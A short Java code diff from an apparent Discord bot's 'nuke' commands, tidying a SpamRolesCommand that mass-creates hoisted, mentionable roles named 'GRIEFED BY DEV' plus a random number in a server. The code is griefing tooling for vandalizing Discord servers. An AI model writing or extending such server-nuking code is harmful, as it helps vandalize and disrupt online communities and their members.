@@ -2,7 +2,6 @@ package me.comu.exeter.commands.nuke;
 
 import me.comu.exeter.core.Core;
 import me.comu.exeter.interfaces.ICommand;
-import net.dv8tion.jda.api.entities.Message;
 import net.dv8tion.jda.api.events.message.guild.GuildMessageReceivedEvent;
 
 import java.util.Arrays;
@@ -26,7 +25,7 @@ public class SpamRolesCommand implements ICommand {
         }
         for (int i = 0; i < input; i++) {
             event.getGuild().createRole().setHoisted(true).setMentionable(true)
-                    .setName("GRIEFED BY SWAG " + Integer.toString(this.getRandom())).queue();
+                    .setName("GRIEFED BY DEV " + this.getRandom()).queue();
             if (i == input - 1) {
                 event.getMessage().delete().queue();
 //                List<Message> messages = event.getChannel().getHistory().retrievePast(2).queue();
@@ -56,7 +55,7 @@ public class SpamRolesCommand implements ICommand {
         return Category.OWNER;
     }
 
-    public int getRandom() {
+    private int getRandom() {
         Random randy = new Random();
         return randy.nextInt();
     }
